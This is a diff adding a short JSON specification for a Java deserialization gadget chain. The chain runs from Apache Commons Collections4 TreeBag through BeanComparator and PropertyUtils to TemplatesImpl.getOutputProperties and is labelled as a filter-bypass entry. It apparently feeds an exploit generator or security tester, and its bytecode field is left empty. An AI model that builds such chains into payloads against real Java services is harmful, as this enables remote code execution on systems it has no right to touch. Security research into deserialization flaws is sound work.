@@ -1,0 +1,23 @@
+{
+    "chain_type": "CB3 — TreeBag + BeanComparator → PropertyUtils → TemplatesImpl (filter-bypass entry)",
+    "root_class": "org.apache.commons.collections4.bag.TreeBag",
+    "root_trigger": "readObject→TreeMap.put→BeanComparator.compare→PropertyUtils.getProperty",
+    "links": [
+        {
+            "class": "org.apache.commons.beanutils.BeanComparator",
+            "field_overrides": {
+                "property": "outputProperties",
+                "comparator": null
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
